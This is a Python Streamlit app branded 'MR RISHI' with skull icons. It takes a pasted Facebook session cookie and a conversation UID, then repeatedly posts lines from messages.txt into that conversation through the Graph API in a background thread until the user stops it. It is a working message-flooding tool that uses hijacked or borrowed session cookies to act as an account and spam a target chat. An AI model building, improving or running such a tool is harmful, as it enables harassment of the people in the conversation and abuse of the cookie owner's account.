import streamlit as st
import requests
import threading
import time
import random
import string
import os
from datetime import datetime

# ================= PAGE CONFIG =================
st.set_page_config(
    page_title="MR RISHI",
    page_icon="☠️",
    layout="centered",
    initial_sidebar_state="collapsed"
)

# ================= CSS =================
st.markdown("""
<style>
.stApp { background: rgba(0,0,0,0.85); }
.title-text {
    text-align:center;
    font-size:2.3em;
    font-weight:bold;
    color:white;
    text-shadow:0 0 15px red;
}
input, textarea {
    background: rgba(255,255,255,0.1) !important;
    color:white !important;
}
</style>
""", unsafe_allow_html=True)

# ================= HEADERS =================
HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*",
    "Connection": "keep-alive"
}

# ================= LOAD DEFAULT TXT =================
def load_messages():
    if os.path.exists("messages.txt"):
        with open("messages.txt", "r", encoding="utf-8") as f:
            return [i.strip() for i in f if i.strip()]
    return []

DEFAULT_MESSAGES = load_messages()

# ================= SESSION =================
for k, v in {
    "tasks": {},
    "stop": {},
    "threads": {},
    "logs": []
}.items():
    if k not in st.session_state:
        st.session_state[k] = v

# ================= SENDER =================
def sender(cookies, thread_id, name, delay, messages, task_id):
    stop_event = st.session_state.stop[task_id]
    sent = 0

    while not stop_event.is_set():
        for msg in messages:
            for cookie in cookies:
                if stop_event.is_set():
                    break
                try:
                    s = requests.Session()
                    ck = {}
                    for c in cookie.split(";"):
                        if "=" in c:
                            k, v = c.strip().split("=", 1)
                            ck[k] = v
                    s.cookies.update(ck)
                    s.headers.update(HEADERS)

                    url = f"https://graph.facebook.com/v15.0/t_{thread_id}/"
                    r = s.post(url, data={"message": f"{name} {msg}"}, timeout=10)

                    st.session_state.logs.append(
                        "✅ Sent" if r.status_code == 200 else f"❌ {r.status_code}"
                    )
                    sent += 1
                    time.sleep(delay)

                except Exception as e:
                    st.session_state.logs.append(f"⚠️ {e}")
                    time.sleep(2)

    st.session_state.tasks[task_id]["status"] = "Stopped"
    st.session_state.tasks[task_id]["sent"] = sent

# ================= START =================
def start_task(cookies, thread_id, name, delay, messages):
    task_id = "".join(random.choices(string.ascii_letters + string.digits, k=8))
    ev = threading.Event()

    st.session_state.stop[task_id] = ev
    st.session_state.tasks[task_id] = {
        "status": "Running",
        "start": datetime.now()
    }

    t = threading.Thread(
        target=sender,
        args=(cookies, thread_id, name, delay, messages, task_id),
        daemon=True
    )
    t.start()
    st.session_state.threads[task_id] = t
    return task_id

# ================= STOP =================
def stop_task(task_id):
    if task_id in st.session_state.stop:
        st.session_state.stop[task_id].set()
        return True
    return False

# ================= UI =================
st.markdown('<div class="title-text">☠️ MR RISHU ☠️</div>', unsafe_allow_html=True)

with st.form("start"):
    cookie = st.text_area("Facebook Cookie")
    thread_id = st.text_input("Conversation UID")
    name = st.text_input("Name")
    delay = st.number_input("Delay (sec)", 1, 60, 5)

    if st.form_submit_button("START"):
        if not DEFAULT_MESSAGES:
            st.error("messages.txt empty or missing")
        elif cookie and thread_id and name:
            tid = start_task([cookie], thread_id, name, delay, DEFAULT_MESSAGES)
            st.success(f"Started Task ID: {tid}")
        else:
            st.error("Fill all fields")

st.markdown("### Stop Task")
sid = st.text_input("Task ID")
if st.button("STOP"):
    st.success("Stopped") if stop_task(sid) else st.error("Task not found")

st.markdown("### Logs")
for l in st.session_state.logs[-10:][::-1]:
    st.write(l)